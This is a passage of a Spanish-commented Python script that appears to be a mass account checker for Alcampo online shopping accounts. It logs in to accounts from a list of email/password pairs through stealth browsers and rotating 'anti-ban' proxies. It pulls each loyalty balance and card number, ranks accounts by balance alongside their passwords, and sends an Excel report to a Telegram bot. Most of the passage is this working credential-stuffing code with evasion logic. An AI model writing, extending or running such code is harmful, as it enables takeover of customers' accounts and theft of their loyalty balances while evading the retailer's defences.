        print(f"Error enviando mensaje a Telegram: {_sanitize_telegram_error(e, token)}")
        return False


def enviar_telegram_documento(token, chat_id, path, caption=""):
    if not token or not chat_id or not path or not os.path.exists(path):
        return False
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        data = {"chat_id": chat_id, "caption": caption}
        with open(path, "rb") as f:
            files = {"document": (os.path.basename(path), f)}
            resp = requests.post(url, data=data, files=files, timeout=45)
            return resp.ok
    except Exception as e:
        print(f"Error enviando documento a Telegram: {_sanitize_telegram_error(e, token)}")
        return False


def enviar_telegram(token, chat_id, texto, excel_path=None):
    if not token or not chat_id:
        return False
    enviar_telegram_texto(token, chat_id, texto)
    if excel_path and os.path.exists(excel_path):
        enviar_telegram_documento(token, chat_id, excel_path, caption="📊 Reporte consolidado de saldos Alcampo")
    return True

# @end: Telegram-Reporting

# @section: Core-Workers

def _scrape_account_with_driver(driver, init_driver_fn, email, password, label_prefix):
    """Executes login + balance extraction for one account with timing instrumentation and error classification."""
    t_account_start = time.time()
    t_chrome = 0.0
    t_login = 0.0
    t_loyalty = 0.0
    saldo = "Error: Desconocido"
    card_number = None
    err_type = "account_error"
    intentos_max = 2

    login_url = (
        "https://www.compraonline.alcampo.es/login?destination=%2Fsettings%2Floyalty"
        if OPT_DIRECT_LOYALTY_REDIRECT
        else "https://www.compraonline.alcampo.es/login?destination=%2F"
    )

    for intento in range(1, intentos_max + 1):
        try:
            if driver is None:
                t0 = time.time()
                driver = init_driver_fn()
                t_chrome += time.time() - t0
            elif intento > 1:
                clean_browser_session(driver)

            t_log0 = time.time()
            try:
                driver.get(login_url)
            except Exception:
                pass
            wait = WebDriverWait(driver, 15)

            try:
                email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
            except Exception as wait_err:
                cur_u = ""
                try:
                    cur_u = driver.current_url
                except Exception:
                    pass
                raise Exception(f"Timeout esperando #uname1 en URL={cur_u[:90]}") from wait_err

            password_field = driver.find_element(By.ID, "pwd1")
            email_field.clear()
            email_field.send_keys(email)
            password_field.clear()
            password_field.send_keys(password)
            submit_login_form(driver)

            outcome = "pending"
            outcome_msg = ""
            poll_start = time.time()
            while time.time() - poll_start < 12.0:
                outcome, outcome_msg = _check_login_outcome(driver)
                if outcome in ("logged_in", "error"):
                    break
                time.sleep(0.25)

            # Fallback if authenticationError occurred on first redirect: check if session cookies work
            if outcome == "error" and "authenticationError" in outcome_msg:
                try:
                    driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
                    time.sleep(1.0)
                    if "settings/loyalty" in driver.current_url and "login" not in driver.current_url and "authenticationError" not in driver.current_url:
                        outcome = "logged_in"
                        outcome_msg = ""
                except Exception:
                    pass

            t_login += time.time() - t_log0

            if outcome != "logged_in":
                page_html = ""
                try:
                    page_html = driver.page_source or ""
                except Exception:
                    pass
                page_html_low = page_html.lower()

                if outcome_msg:
                    saldo = outcome_msg
                elif "call center" in page_html_low or "cuenta ha sido bloqueada" in page_html_low:
                    saldo = "Error: Cuenta bloqueada (Call Center 913 687 857)"
                elif any(k in page_html_low for k in ["código de verificación", "codigo de verificacion", "identity verification", "device activation"]):
                    saldo = "Error: Requiere código de verificación 2FA/Email"
                elif any(k in page_html_low for k in ["usuario o contraseña incorrectos", "credenciales incorrectas", "contraseña no válida", "usuario incorrecto"]):
                    saldo = "Error: Credenciales incorrectas"
                else:
                    curr_url_err = ""
                    try:
                        curr_url_err = driver.current_url.lower()
                    except Exception:
                        pass
                    if "my.site.com" in curr_url_err or "authorization" in curr_url_err or "login" in curr_url_err:
                        saldo = "Error: Credenciales no redirigidas o no válidas"
                    else:
                        saldo = "Error: Bloqueo/Timeout"

                err_type, reason = circuit_breaker.classify_error(page_source=page_html, error_msg=saldo)
                print(f"{label_prefix} 🔴 {mask_email(email)} → {saldo} [{err_type}] (login={t_login:.2f}s)")

                if err_type in ("account_error", "needs_attention"):
                    break
                if intento < intentos_max:
                    adaptive_pacer.record_pressure(reason or saldo)
                    time.sleep(1.5)
                    continue
                break

            # Logged in: extract loyalty balance and card number
            t_loy0 = time.time()
            saldo = _extract_loyalty_balance(driver, timeout_s=10.0)
            t_loyalty += time.time() - t_loy0

            try:
                card_number = extraer_tarjeta(driver.page_source)
            except Exception:
                pass

            if "Tu Saldo es" in saldo:
                err_type = "ok"
                total_s = time.time() - t_account_start
                print(
                    f"{label_prefix} ✔ {mask_email(email)} → {saldo} | TARJETA: {card_number or 'N/A'} "
                    f"(total={total_s:.2f}s | login={t_login:.2f}s | saldo={t_loyalty:.2f}s)"
                )
                break
            else:
                saldo = "Error: Saldo no hidratado en DOM"
                err_type = "ip_error"
                if intento < intentos_max:
                    continue

        except Exception as e:
            err_str = str(e).splitlines()[0] if str(e) else "Excepción WebDriver"
            print(f"{label_prefix} ❌ Error en {mask_email(email)} (Intento {intento}/{intentos_max}): {err_str}")
            if driver:
                try:
                    driver.quit()
                except Exception:
                    pass
                driver = None
            if intento == intentos_max:
                saldo = f"Error: Bloqueo/Timeout ({err_str[:80]})"
                err_type, _ = circuit_breaker.classify_error(error_msg=saldo)

    if driver:
        clean_browser_session(driver)

    total_s = round(time.time() - t_account_start, 2)
    return driver, {
        "email": email,
        "password": password,
        "saldo": saldo,
        "card_number": card_number,
        "error_type": err_type,
        "chrome_s": round(t_chrome, 2),
        "login_s": round(t_login, 2),
        "loyalty_s": round(t_loyalty, 2),
        "total_s": total_s
    }


def procesar_bloque(accounts_chunk, thread_idx, job_start_time=None):
    resultados = []
    driver = None
    recycle_every = getattr(current_cli_args, 'recycle_every', 12) if 'current_cli_args' in globals() and current_cli_args else 12
    consecutive_ip_blocks = 0

    current_proxy = None
    if global_proxy_manager:
        current_proxy = global_proxy_manager.get_proxy()
        if current_proxy:
            print(f"[Hilo {thread_idx}] 🛡️ [Anti-Ban Proxy] Asignado: {current_proxy}")

    def init_driver():
        nonlocal driver
        if driver:
            try:
                driver.quit()
            except Exception:
                pass
        driver = create_stealth_driver(proxy=current_proxy, timeout=20)
        return driver

    job_start = job_start_time or time.time()

    for idx, acc in enumerate(accounts_chunk):
        elapsed_min = (time.time() - job_start) / 60.0
        if elapsed_min >= MAX_EXECUTION_MINUTES:
            print(f"[Hilo {thread_idx}] ⏱️ Guardarraíl temporal alcanzado ({elapsed_min:.2f} min).")
            break

        if circuit_breaker.triggered:
            print(f"[Hilo {thread_idx}] 🛑 Circuit Breaker activado. Abortando {mask_email(acc['email'])}.")
            break

        # Reciclaje periódico de sesión cada N cuentas
        if idx > 0 and idx % recycle_every == 0:
            print(f"[Hilo {thread_idx}] 🔄 Reciclando sesión de Chrome ({idx} cuentas) para limpiar huellas y memoria...")
            driver = init_driver()

        email = acc["email"]
        password = acc["password"]

        adaptive_pacer.wait()
        driver, res = _scrape_account_with_driver(driver, init_driver, email, password, f"[Hilo {thread_idx}]")
        resultados.append(res)

        status = "error" if res["error_type"] != "ok" else "success"
        update_progress(thread_idx, email, status, res["saldo"])

        is_down, reason = circuit_breaker.is_server_down_error(error_msg=res["saldo"])
        triggered, trigger_reason = circuit_breaker.record_result(is_down, reason, error_type=res["error_type"])
        if triggered:
            print(f"🚨 [CIRCUIT BREAKER DISPARADO] {trigger_reason}. Abortando hilo {thread_idx}.")
            break

        if res["error_type"] == "ok":
            consecutive_ip_blocks = 0
            adaptive_pacer.record_success(res.get("total_s", 0))
        elif res["error_type"] == "ip_error":
            consecutive_ip_blocks += 1
            adaptive_pacer.record_pressure(res["saldo"])
            if consecutive_ip_blocks >= 2:
                print(f"[Hilo {thread_idx}] ⚠️ [Anti-Ban] Detectados {consecutive_ip_blocks} fallos IP consecutivos. Pausando 20s y renovando sesión...")
                time.sleep(20)
                driver = init_driver()
                consecutive_ip_blocks = 0
        else:
            consecutive_ip_blocks = 0

    if driver:
        try:
            driver.quit()
        except Exception:
            pass

    return resultados


def procesar_bloque_dinamico(worker_name, thread_idx, job_start_time=None):
    resultados = []
    driver = None
    recycle_every = getattr(current_cli_args, 'recycle_every', 12) if 'current_cli_args' in globals() and current_cli_args else 12
    consecutive_ip_blocks = 0

    current_proxy = None
    if global_proxy_manager:
        current_proxy = global_proxy_manager.get_proxy()
        if current_proxy:
            print(f"[{worker_name} Hilo {thread_idx}] 🛡️ [Anti-Ban Proxy] Asignado: {current_proxy}")

    def init_driver():
        nonlocal driver
        if driver:
            try:
                driver.quit()
            except Exception:
                pass
        driver = create_stealth_driver(proxy=current_proxy, timeout=20)
        return driver

    job_start = job_start_time or time.time()
    acc_count = 0

    while True:
        elapsed_min = (time.time() - job_start) / 60.0
        if elapsed_min >= MAX_EXECUTION_MINUTES:
            print(f"[{worker_name} Hilo {thread_idx}] ⏱️ Guardarraíl temporal ({elapsed_min:.2f} min). Abortando consumo de cola.")
            break

        if circuit_breaker.triggered:
            print(f"[{worker_name} Hilo {thread_idx}] 🛑 Circuit Breaker activado. Abortando cola.")
            break

        acc = claim_account_from_queue(f"{worker_name}_t{thread_idx}")
        if not acc:
            print(f"[{worker_name} Hilo {thread_idx}] 🎉 No quedan más cuentas en la cola dinámica de Firebase.")
            break

        acc_count += 1
        if acc_count > 1 and acc_count % recycle_every == 0:
            print(f"[{worker_name} Hilo {thread_idx}] 🔄 Reciclando sesión de Chrome ({acc_count} cuentas)...")
            driver = init_driver()

        email = acc["email"]
        password = acc["password"]

        adaptive_pacer.wait()
        driver, res = _scrape_account_with_driver(driver, init_driver, email, password, f"[{worker_name} Hilo {thread_idx}]")
        resultados.append(res)

        status = "error" if res["error_type"] != "ok" else "success"
        update_progress(thread_idx, email, status, res["saldo"], worker_name=worker_name)

        is_down, reason = circuit_breaker.is_server_down_error(error_msg=res["saldo"])
        triggered, trigger_reason = circuit_breaker.record_result(is_down, reason, error_type=res["error_type"])
        if triggered:
            print(f"🚨 [CIRCUIT BREAKER DISPARADO] {trigger_reason}. Abortando {worker_name} hilo {thread_idx}.")
            break

        if res["error_type"] == "ok":
            consecutive_ip_blocks = 0
            adaptive_pacer.record_success(res.get("total_s", 0))
        elif res["error_type"] == "ip_error":
            # Devolver a la cola para que otra máquina la procese si fue fallo de IP
            release_account_to_queue(email, reason=res["saldo"])
            consecutive_ip_blocks += 1
            adaptive_pacer.record_pressure(res["saldo"])
            if consecutive_ip_blocks >= 2:
                print(f"[{worker_name} Hilo {thread_idx}] ⚠️ [Anti-Ban] Detectados {consecutive_ip_blocks} fallos IP consecutivos. Pausando 20s y renovando sesión...")
                time.sleep(20)
                driver = init_driver()
                consecutive_ip_blocks = 0
        else:
            consecutive_ip_blocks = 0

    if driver:
        try:
            driver.quit()
        except Exception:
            pass

    return resultados

# @end: Core-Workers

# @section: Server-And-CLI

def start_local_dashboard_server(port=8000, open_browser=False):
    """Inicia el servidor local de Server.py en un hilo daemon para visualización web."""
    import socket
    import webbrowser
    def _is_port_in_use(p):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('127.0.0.1', p)) == 0

    if _is_port_in_use(port):
        print(f"ℹ️ Servidor Dashboard ya activo en http://localhost:{port}")
        return

    def _run():
        try:
            from server import run_server
            run_server(port=port)
        except Exception as e:
            print(f"Advertencia iniciando servidor local: {e}")

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    print(f"🚀 [Dashboard Local] Servidor web iniciado en http://localhost:{port}")
    if open_browser:
        try:
            webbrowser.open(f"http://localhost:{port}")
        except Exception:
            pass


def parse_args():
    parser = argparse.ArgumentParser(description="Scraper multi-hilo optimizado Alcampo con Anti-Ban, Cooldown y Cola Dinámica.")
    parser.add_argument("--threads", type=int, default=2, help="Número de hilos concurrentes")
    parser.add_argument("--limit", type=int, default=None, help="Límite máximo de cuentas a procesar")
    parser.add_argument("--start-index", type=int, default=None, help="Índice inicial de cuentas a procesar")
    parser.add_argument("--input-file", type=str, default=None, help="Ruta al archivo JSON de cuentas a procesar")
    parser.add_argument("--output-file", type=str, default=None, help="Ruta de salida del archivo Excel")
    parser.add_argument("--shard-id", type=int, default=None, help="Índice de shard de la matriz")
    parser.add_argument("--total-shards", type=int, default=None, help="Número total de shards de la matriz")
    parser.add_argument("--use-queue", action="store_true", help="Consumir cuentas de la cola dinámica de Firebase")
    parser.add_argument("--init-queue", action="store_true", help="Cargar cuentas en la cola dinámica de Firebase y salir")
    parser.add_argument("--single-check", action="store_true", help="Chequear una única cuenta y salir")
    parser.add_argument("--email", type=str, default=None, help="Email para --single-check")
    parser.add_argument("--password", type=str, default=None, help="Password para --single-check")
    parser.add_argument("--scrape-card", action="store_true", default=True, help="Extraer número de tarjeta Alcampo")
    parser.add_argument("--card-number", type=str, default=None, help="Número de tarjeta existente para reutilizar")
    parser.add_argument("--send-telegram", action="store_true", default=True, help="Enviar resumen final a Telegram")
    parser.add_argument("--no-telegram", action="store_true", help="Desactivar envío de Telegram")
    parser.add_argument("--no-server", action="store_true", help="No iniciar servidor local")
    parser.add_argument("--open-browser", action="store_true", help="Abrir navegador en el dashboard local")
    parser.add_argument("--port", type=int, default=8085, help="Puerto del servidor local (default: 8085)")
    parser.add_argument("--ignore-cooldown", action="store_true", default=os.environ.get("IGNORE_COOLDOWN", "").lower() in ("true", "1", "yes"), help="Ignorar el cooldown de 5 días y probar todas las cuentas")
    parser.add_argument("--reset-cooldown", action="store_true", help="Resetear contadores de fallo y estados de cooldown")
    parser.add_argument("--proxy", type=str, default=None, help="Proxy único para rotación")
    parser.add_argument("--proxy-file", type=str, default=None, help="Archivo con lista de proxies")
    parser.add_argument("--recycle-every", type=int, default=12, help="Reciclar sesión de Chrome cada N cuentas")
    parser.add_argument("--delay-min", type=float, default=0.7, help="Retardo mínimo entre cuentas")
    parser.add_argument("--delay-max", type=float, default=1.4, help="Retardo máximo entre cuentas")
    return parser.parse_args()

current_cli_args = None


def main():
    global current_cli_args, global_proxy_manager
    args = parse_args()
    current_cli_args = args

    global_proxy_manager = ProxyManager(proxy=args.proxy, proxy_file=args.proxy_file)

    # 0. Single check mode
    if args.single_check:
        email = args.email or os.environ.get("CHECK_EMAIL")
        password = args.password or os.environ.get("CHECK_PASSWORD")
        if not email or not password:
            print("❌ Error: --email y --password son requeridos para --single-check")
            sys.exit(1)
        res = check_single_account(email, password, scrape_card=args.scrape_card, existing_card_number=args.card_number)
        print(f"Resultado single check: {res}")

        # Registrar en AccountCooldownManager
        try:
            cd_mgr = AccountCooldownManager()
            is_ok = (res.get("status") == "success" and res.get("balance") is not None)
            cd_res = cd_mgr.record_result(email, is_ok, error_msg=res.get("error"))
            cd_mgr.save()
            print(f"📋 [Cooldown] Resultado registrado para {mask_email(email)}: {cd_res}")
        except Exception as cd_err:
            print(f"Advertencia actualizando cooldown manager: {cd_err}")

        sys.exit(0 if res["status"] == "success" else 1)

    # Iniciar servidor local si no está desactivado
    if not args.no_server and not args.init_queue:
        start_local_dashboard_server(port=args.port, open_browser=args.open_browser)

    telegram_token, chat_id = get_telegram_config()
    send_telegram = args.send_telegram and not args.no_telegram

    # Cargar cuentas
    target_accounts_path = Path(args.input_file) if args.input_file else ACCOUNTS_FILE
    if not target_accounts_path.exists():
        print(f"❌ Error: No se encuentra {target_accounts_path}")
        sys.exit(1)

    with open(target_accounts_path, "r", encoding="utf-8") as f:
        accounts = json.load(f)

    # Cooldown Manager
    cooldown_mgr = AccountCooldownManager()
    total_raw_accounts = len(accounts)

    if args.reset_cooldown:
        print("🔄 [CooldownManager] Reactivando todas las cuentas en lista de espera...")
        unpaused = cooldown_mgr.unpause_all_cooldowns()
        print(f"✔ {unpaused} cuentas reactivadas de la lista de espera.")

    skipped_cooldown = []
    retesting_cooldown = []

    if not args.ignore_cooldown:
        accounts, skipped_cooldown, retesting_cooldown = cooldown_mgr.filter_accounts_for_run(accounts)
        print("\n" + "="*60)
        print("🛡️ GESTIÓN INTELIGENTE DE CUENTAS (COOLDOWN 5 DÍAS):")
        print(f"   • Total en base de datos: {total_raw_accounts}")
        print(f"   • Cuentas activas a procesar hoy: {len(accounts)}")
        if skipped_cooldown:
            print(f"   • 🛑 DESCARTADAS en reposo (5 días): {len(skipped_cooldown)}")
        if retesting_cooldown:
            print(f"   • 🔄 EN RE-TEST tras reposo cumplido: {len(retesting_cooldown)}")
        print("="*60 + "\n")
    else:
        print("\n" + "="*60)
        print("⚡ MODO FORZAR TODAS LAS CUENTAS ACTIVADO (--ignore-cooldown):")
        print(f"   • Se prueban TODAS las cuentas ({len(accounts)}), incluyendo las de reposo.")
        print("="*60 + "\n")

    # Inicializar cola en Firebase si se solicita
    if args.init_queue:
        init_firebase_queue(accounts)
        sys.exit(0)

    # Canario IP
    worker_label = f"VM_{args.shard_id}" if args.shard_id is not None else "Worker"
    if not run_ip_canary(worker_label=worker_label):
        print(f"🚨 [QUARANTINE] {worker_label} abortando ejecución por bloqueo en Canario IP.")
        sys.exit(1)

    # Modo Cola Dinámica
    if args.use_queue:
        print(f"🚀 [COLA DINÁMICA FIREBASE] {worker_label} arrancando {args.threads} hilos dinámicos...")
        init_progress(len(accounts))
        num_threads = max(1, args.threads)
        resultados = []
        start_time = time.time()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {
                executor.submit(procesar_bloque_dinamico, worker_label, i + 1, start_time): i
                for i in range(num_threads)
            }
            for future in as_completed(futures):
                resultados.extend(future.result())

        if len(resultados) == 0 and args.shard_id is not None and args.total_shards is not None and len(accounts) > 0:
            print(f"\n⚠️ [COLA DINÁMICA] La cola de Firebase no devolvió cuentas. Activando fallback a partición Shard {args.shard_id}/{args.total_shards}...")
        else:
            end_time = time.time()
            duration = end_time - start_time

            target_excel_path = Path(args.output_file) if args.output_file else EXCEL_FILE
            import pandas as pd
            df = pd.DataFrame(resultados)
            df.to_excel(target_excel_path, index=False)
            print(f"\n💾 Resultados de Cola Dinámica guardados en: {target_excel_path}")
            print(f"⏱️ Tiempo total de ejecución: {duration:.2f} segundos ({duration/60:.2f} minutos)")

            # Actualizar cooldown
            for r in resultados:
                em = r.get("email", "").strip()
                if em:
                    s_val = str(r.get("saldo", ""))
                    v_num = limpiar_saldo(s_val)
                    is_ok = (v_num is not None and "Error" not in s_val and "No encontrado" not in s_val and "Call Center" not in s_val)
                    cooldown_mgr.record_result(em, is_ok, error_msg=s_val)
            cooldown_mgr.save()
            sys.exit(0)

    # Filtrar por Shard
    if args.shard_id is not None and args.total_shards is not None:
        accounts = [acc for i, acc in enumerate(accounts) if i % args.total_shards == args.shard_id]
        print(f"ℹ️ Modo Matriz (Módulo): Shard {args.shard_id}/{args.total_shards} -> {len(accounts)} cuentas asignadas.")
    elif args.start_index is not None and args.limit is not None:
        accounts = accounts[args.start_index:args.start_index + args.limit]
        print(f"ℹ️ Modo Rango: Desde {args.start_index} limit {args.limit} -> {len(accounts)} cuentas asignadas.")
    elif args.limit:
        accounts = accounts[:args.limit]
        print(f"ℹ️ Modo prueba: Limitado a las primeras {args.limit} cuentas.")

    init_progress(len(accounts))

    num_threads = min(args.threads, len(accounts)) if len(accounts) > 0 else 1
    chunks = [[] for _ in range(num_threads)]
    for i, acc in enumerate(accounts):
        chunks[i % num_threads].append(acc)

    print(f"🚀 Iniciando verificación de {len(accounts)} cuentas repartidas en {num_threads} hilos...")

    if send_telegram:
        try:
            enviar_telegram_texto(telegram_token, chat_id,
                f"🚀 <b>Iniciando ejecución Alcampo Fusion v3.0</b>\n\n"
                f"📋 Cuentas a procesar: {len(accounts)}\n"
                f"⚙️ Hilos: {num_threads}\n\n"
                f"👀 <b>Ver en tiempo real:</b>\n"
                f"https://alcampo.vercel.app/#live"
            )
        except Exception as e:
            print(f"Error enviando mensaje inicial a Telegram: {e}")

    resultados = []
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {
            executor.submit(procesar_bloque, chunks[i], i + 1, start_time): i
            for i in range(num_threads)
        }
        for future in as_completed(futures):
            resultados.extend(future.result())

    end_time = time.time()
    duration = end_time - start_time

    import pandas as pd
    target_excel_path = Path(args.output_file) if args.output_file else EXCEL_FILE
    df = pd.DataFrame(resultados)
    df.to_excel(target_excel_path, index=False)
    print(f"\n💾 Resultados guardados en: {target_excel_path}")
    print(f"⏱️ Tiempo total de ejecución: {duration:.2f} segundos ({duration/60:.2f} minutos)")

    # Resumen
    saldo_total = 0.0
    cuentas_con_saldo = 0
    cuentas_saldo_cero = 0
    cuentas_error = 0
    cuentas_ranked = []

    for r in resultados:
        valor = limpiar_saldo(r.get("saldo"))
        if valor is None:
            cuentas_error += 1
            continue
        saldo_total += valor
        if valor > 0:
            cuentas_con_saldo += 1
            cuentas_ranked.append((valor, r["email"], r.get("password", "")))
        elif valor == 0:
            cuentas_saldo_cero += 1

    # Actualizar cooldown
    recovered_count = 0
    newly_cooldown_count = 0
    for r in resultados:
        em = r.get("email", "").strip()
        if not em:
            continue
        s_val = str(r.get("saldo", ""))
        v_num = limpiar_saldo(s_val)
        is_ok = (v_num is not None and "Error" not in s_val and "No encontrado" not in s_val and "Call Center" not in s_val)
        c_res = cooldown_mgr.record_result(em, is_ok, error_msg=s_val)
        if c_res.get("action") == "recovered":
            recovered_count += 1
            print(f"🎉 [RECUPERADA] {mask_email(em)} vuelve a funcionar tras el período de reposo!")
        elif c_res.get("action") == "entered_cooldown":
            newly_cooldown_count += 1
            print(f"🛑 [EN REPOSO] {mask_email(em)} falló 5 días consecutivos. Descartada hasta {c_res.get('cooldown_until')}!")

    cooldown_mgr.save()

    cuentas_ranked.sort(key=lambda x: x[0], reverse=True)
    top_10 = cuentas_ranked[:10]

    top_10_text = "\n".join(
        f"   {i+1}. {mask_email(email)} ({val:.2f} €)"
        for i, (val, email, _) in enumerate(top_10)
    ) if top_10 else "   N/A"

    cooldown_section = ""
    if skipped_cooldown or retesting_cooldown or newly_cooldown_count > 0 or recovered_count > 0:
        cooldown_section = (
            f"\n🛡️ <b>Control de Fallos y Reposo (5 días):</b>\n"
            f"   • 🛑 Cuentas en reposo (saltadas hoy): {len(skipped_cooldown)}\n"
            f"   • 🔄 Cuentas re-evaluadas tras reposo: {len(retesting_cooldown)}\n"
            f"   • 🎉 Cuentas recuperadas hoy: {recovered_count}\n"
            f"   • ⚠️ Nuevas enviadas a reposo: {newly_cooldown_count}\n"
        )

    resumen_text = (
        f"📊 <b>Resumen Alcampo Fusion v3.0</b>\n\n"
        f"• Total comprobadas: {len(resultados)}\n"
        f"• Cuentas con saldo (>0€): {cuentas_con_saldo}\n"
        f"• Cuentas con saldo 0€: {cuentas_saldo_cero}\n"
        f"• Errores / Atención: {cuentas_error}\n"
        f"• <b>Saldo total extraído: {saldo_total:.2f} €</b>\n"
        f"{cooldown_section}\n"
        f"🏆 <b>Top 10 Cuentas:</b>\n{top_10_text}\n\n"
        f"⏱️ Tiempo: {duration/60:.1f} min"
    )

    if send_telegram:
        enviar_telegram(telegram_token, chat_id, resumen_text, str(target_excel_path))

if __name__ == "__main__":
    main()

# @end: Server-And-CLI
